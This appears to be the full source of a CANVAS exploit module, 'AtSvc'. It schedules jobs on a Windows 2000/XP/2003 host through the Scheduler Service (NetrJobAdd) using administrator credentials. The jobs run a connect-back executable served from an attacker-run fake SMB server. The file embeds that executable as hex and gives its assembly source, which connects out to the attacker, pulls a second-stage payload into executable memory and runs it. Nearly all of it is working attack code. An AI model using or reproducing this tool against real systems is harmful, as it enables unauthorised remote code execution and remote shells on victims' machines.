#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path: sys.path.append(".")
import time
import struct

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_win2k_unistring

# GUI info
NAME="AtSvc"
DESCRIPTION="Microsoft Scheduler Service NetrJobAdd"
DOCUMENTATION={}
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["CVE Name"] = ""
DOCUMENTATION["Repeatability"] = ""
DOCUMENTATION["References"]=""
VERSION="0.1"
PROPERTY = {}
PROPERTY['TYPE'] = "Tools"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
CHANGELOG="""
"""

NOTES="""
This should eventually be particularly useful to execute commands using a TCP port > 1024,
but obviously *needing* Administrators credentials.

We locally set up a fake SMB server in order to serve a file that will be requested by the
attacked machine, specifying a job like '\ \ IP \ binary arguments' This PoC embedds a small
MOSDEF ConnectBack binary that will give you a shell.

The scheduler service RPC functions are a bit painful because you cannot remotely retrieve
the time on the attacked machine. Thus, we schedule our job every two minutes, one would
probably want to do a 'at /delete /yes' once logged in.

TODO:
-fix up the threading!
-add support for win32node
-delete jobs that have been added
-on XP, get the time on the machine thanks to the Time Service running in the same process?
-let user specify the binary to execute?
- Use ICMP Timestamp to learn what time it is remotely (or HTTP)

Tested on:
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English UP2DATE

Usage (requires superuser privileges for the fake SMB server):
./exploits/atsvc/atsvc.py -t 10.10.11.60 -l 10.10.11.1 -d 5555 -O user:Administrator -O password:none
"""
DOCUMENTATION["Note"]=NOTES

targets = {
    0 : ["Windows 2000, XP, 2003"],
    }

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.version = 0
        self.badstring = "\x00"
        self.myDCE = None
        self.connectionList = []
        self.UUID = u"1ff70682-0a51-30e8-076d-740be8cee98b"
        self.uuidversion = u"1.0"
        self.targetfunction = 0
        self.needsNoShellcode = 1
        self.autoversion = 0
        self.covertness = 0
        self.port = 1025
        self.forceauth = 0
        self.user = 'Administrator'
        self.password = ''
        self.filename = 'cb.exe' #connect back executable below, ASM code at the end of the file
        self.filedata = binstring('4D5A40000100000002000400FFFF0200400000000E0000001C0000000000000057696E3332206F6E6C79210D0A240EB409BA00001FCD21B8014CCD2140000000504500004C010200E7D16E455B4C6F726450455DE00003010B01080000020000000200000000000000100000001000000020000000004000001000000002000004000000000000000400000000000000C02000000002000000000000030000000000100000100000000010000010000000000000100000000000000000000000242000003C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000240000000000000000000000000000000000000000000000000000002E7465787400000000100000001000000301000000020000000000000000000000000000200000602E72646174610000C000000000200000C2000000000400000000000000000000000000004000004000000000000000000000000000000000000000000000000000200000240000000000000000000000000000000000000000000000000000002E7465787400000000010000001000000002000000040000000000000000000000000000200000602E72646174610000C0000000002000000002000000060000E8D1000000FC9731C0F2AEFD8D77FE31DB31C94131C0AC83F8200F840D00000083E8300FAFC101C36BC90AEBE731C08D7E01AA6A2058F2AEFC474757E8A10000009388E1C1E00888C8C1E010B0029781EC0002000054B401B00150E8880000006A066A016A02E8830000006A006A00535789E16A10515093E87700000085C00F8C4A00000089E66A006A045653E86800000083F8040F8534000000AD976A40680010000068004000006A00E82C00000085C00F8417000000966A00575653E83700000039F80F850400000087DEFFE331C089EC5DC3CCFF2504204000FF2500204000FF250C204000FF2510204000FF2514204000FF2518204000FF251C204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009620000084200000000000000B0000807300008017000080040000801000008000000000602000000000000000000000A6200000002000006C2000000000000000000000B42000000C20000000000000000000000000000000000000000000009620000084200000000000000B00008073000080170000800400008010000080000000001001476574436F6D6D616E644C696E65410081035669727475616C416C6C6F6300004B45524E454C33322E646C6C00005753325F33322E646C6C00000000')
        self.jobsid = []
        self.domain=""
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
   
    def buildConnectionList(self):
        host = self.host
        #connectionList = ["ncacn_ip_tcp:%s[%d]" % (host, self.port)]
        connectionList = [#"ncacn_ip_tcp:%s[%d]" % (host, self.port),\
                          "ncacn_np:%s[\\atsvc]"% (host),\
                          #"ncacn_ip_tcp:%s[1025]" % host,\
                          #"ncacn_ip_tcp:%s[1026]" % host,\
                          #"ncacn_ip_tcp:%s[1027]" % host
            ]
        #connectionList += self.searchifids() #make that work with tcpexploit!
        connectionList = uniquelist(connectionList)
        
        self.connectionList = connectionList
        return self.connectionList

    def connect(self):
        self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
            
        self.log(u"AtSvc connecting with user:password of %s:%s" % (self.user, self.password))
        for binding in self.connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              domain=self.domain, frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote server - service is not running or the host is firewalled.')
            return 0

        self.log("Attacking target")
        return 1

    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.user = self.argsDict.get("user", self.user)
        self.password = self.argsDict.get("password", self.password)
        self.domain = self.argsDict.get("domain", self.domain)
        return 
        
    def test(self):
        self.getargs()
        ret=self.connect()
        if ret:
            self.log("Connected to atsvc")
            return 1
        return 0
        
            
    def setupSMBServer(self):
        """
        Starts a listening SMB Server
        """
        import smbserver
        self.log("Starting SMBServer")
        mysmbserver=smbserver.SMBServer("0.0.0.0", 445)
        #two minutes divided by number of tries
        mysmbserver.timeout=120/4 + 10 #must stay up for two minutes at least
        mysmbserver.target = self.host #make sure only target can connect
        mysmbserver.set_file_data(self.filename, self.filedata) #load the file data up
        if mysmbserver.listen() == 0:
            self.log("Could not listen!")
            return
        self.log("Accepting connections")
        tries = 0
        self.smblock.acquire()
        self.smbinit = 1
        self.smblock.release()
        while mysmbserver.accept() == 0:
            self.log("Waiting for new client... (Try: %d/3)" % (tries))
            tries += 1
            if tries > 3:
                break
            if self.ISucceeded():
                break
        if 1:
            while mysmbserver.handle() and not self.state==self.HALT:
                time.sleep(1)
        self.log("Terminating SMBServer")
        time.sleep(10)
        return 

    def NetrJobAdd(self, jobtime, command):       
        """
        Add a job to our target
        """
        packet=intel_order(0)        #ServerName
        packet+=intel_order(jobtime) #JobTime
        packet+=intel_order(0)       #DaysOfMonth
        packet+='\x00'               #DaysOfWeek
        packet+='\x18'               #Flags=JOB_NONINTERACTIVE|JOB_ADD_CURRENT_DATE
        while (len(packet)%4)!=0:
            packet+='\x00'
        packet+=intel_order(1)       #Command
        packet+=s_dce_win2k_unistring(command)
        try:
            self.myDCE.call(0, packet, response=True)
            ret = self.myDCE.reassembled_data
            if ret == 0:
                self.log("Could not call NetrJobAdd on target")
                return False 
            id, status = struct.unpack('<LL', ret[0:8])
            if status != 0:
                self.log('NetrJobAdd of job %d failed with status %d' % (id, status))
            else:
                self.jobsid.append(id)
        except Exception, emsg:
            self.log('NetrJobAdd: %s' % str(emsg))
            return False 
        return True 

    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d - (in progress)" % (self.name, self.host, self.port), showlog = True)
        node = self.argsDict["passednodes"][0]
        self.log("Running on Node type: %s" % node.nodetype)
        self.setProgress(25)
        if node.nodetype == "win32Node":
            app = self.engine.getModuleExploit("addnullshare")
            app.link(self)
            app.argsDict["share"] = "TMP"
            app.run()
            #TODO: code
            #time.sleep(5)
            self.log("Cannot do Win32 Nodes")
            return 0
        else:
            import threading
            self.smblock = threading.Lock()
            self.smbinit = 0
            self.SMBthr = threading.Thread(target = self.setupSMBServer)
            self.SMBthr.start()
            time.sleep(1)
            self.smblock.acquire()
            if self.smbinit != 1:
                self.state=self.HALT
                self.log("Could not listen on port 445. You should be running as root!")
                return 0
            self.smblock.release()
        self.connect()
        self.setProgress(50)
        jobtime = 0
        command = '\\\\%s\\TMP\\cb.exe %s %s' % (self.callback.ip, self.callback.ip, self.callback.port)
        while jobtime < 86400000:
            ret=self.NetrJobAdd(jobtime, command)
            if not ret:
                self.log("Adding jobs is not working ... bailing")
                self.state=self.HALT #kill off our smb server
                return False 
            jobtime += 2*60*1000 #schedule job every 2 minutes
        self.log(" Jobs ID: %s"% self.jobsid)
        self.setProgress(75)
        if node.nodetype != "win32Node":
            self.SMBthr.join()
        self.setProgress(100)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog = True)
            self.log("%s done (succeeded!)" % self.name)
            self.state=self.HALT
            return 1
        self.setInfo("%s attacking %s:%d (failed)" % (self.name, self.host, self.port), showlog = True)
        self.log("%s done (failed)" % self.name)
        self.state=self.HALT #kill our smb server
        return 0

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d: %s" % (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)

'''
;Small MOSDEF ConnectBack PE (1218 bytes)
;
;nasmw.exe -O1 -fwin32 cb.asm
;link.exe /subsystem:console /entry:main cb.obj kernel32.lib ws2_32.lib
;
;Resulting binary rebuilt with LordPE to shrink it a bit

global _main

extern _GetCommandLineA@0
extern _inet_addr@4
extern _WSAStartup@8
extern _socket@12
extern _connect@12
extern _recv@16
extern _VirtualAlloc@16

    section .text
_main:
    call _GetCommandLineA@0
    cld
    xchg eax,edi
    xor eax,eax
    repnz scasb
    std
    lea esi,[edi-0x2]
    xor ebx,ebx
    xor ecx,ecx
    inc ecx
atoi:
    xor eax,eax
    lodsb
    cmp eax,0x20
    je continue
    sub eax,0x30
    imul eax,ecx
    add ebx,eax
    imul ecx,0xa
    jmp atoi
continue:
    xor eax,eax
    lea edi,[esi+0x1]
    stosb
    push 0x20
    pop eax
    repnz scasb
    cld
    inc edi
    inc edi
    push edi
    call _inet_addr@4
    xchg eax,ebx ;IPADDRESS in ebx
    mov cl,ah
    shl eax,8
    mov al,cl
    shl eax,16
    mov al,0x2
    xchg eax,edi ;PORT in edi
    sub esp,0x200
    push esp
    mov ah,0x1
    mov al,0x1
    push eax
    call _WSAStartup@8
    push 0x6
    push 0x1
    push 0x2
    call _socket@12
    push 0x0
    push 0x0
    push ebx
    push edi
    mov ecx,esp
    push 0x10
    push ecx
    push eax
    xchg eax,ebx ;SOCKET in ebx
    call _connect@12
    test eax,eax
    jl exit
    mov esi,esp
    push 0x0
    push 0x4
    push esi
    push ebx
    call _recv@16
    cmp eax,0x4
    jne exit
    lodsd
    xchg eax,edi ;LENGTH in edi
    push 0x40
    push 0x1000
    push 0x4000
    push 0x0
    call _VirtualAlloc@16
    test eax,eax
    jz exit
    xchg eax,esi
    push 0x0
    push edi
    push esi
    push ebx
    call _recv@16
    cmp eax,edi
    jne exit
    xchg ebx,esi ;SOCKET in esi
    jmp ebx
exit:
    xor eax,eax
    mov esp,ebp
    pop ebp
    ret
'''
